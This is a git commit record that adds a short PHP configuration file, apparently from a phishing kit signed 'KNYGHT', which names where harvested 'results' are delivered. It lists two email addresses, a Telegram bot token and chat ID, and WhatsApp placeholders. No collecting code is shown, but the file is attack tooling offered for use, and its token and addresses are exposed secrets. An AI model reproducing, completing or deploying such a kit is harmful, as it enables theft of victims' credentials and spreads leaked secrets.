8300a4c2a8dbec580ef959f1ef504dc3c50da3f8
unixcrew <127454479+unixcrew@users.noreply.github.com>
2024-01-25 17:31:49 +0200

    Add files via upload

---
+++ knyght.php
@@ -0,0 +1,24 @@
+<?php
+/*
+  //||~~ By ~~ KNYGHT ~~\\         			       	                
+ // Telegram Id: @KNYGHT \\	
+*/
+$send ="goodman443442@gmail.com,goodman443442@yandex.ru"; 
+
+//telgram rzlt\\
+
+$api = "6889759815:AAHycPO4GrVnmLelRrhdgG7LvjKxNtp3uxs";     //  use @BotFather to create telegram bot
+
+
+$chatid = "5167284490"; 	// Get Chat Id From @RawDataBot
+
+
+//Whatsapp rzlt\\  | Instruction to setup whatsapp to recive rezlts  https://i.imgur.com/sj1akbO.png |
+
+
+$phone="Ur Whatsapp No";  		  // Enter your Whatsapp number here
+
+$apikey="Key";      		 // Enter your personal apikey received in step 3 above
+
+								
+?>
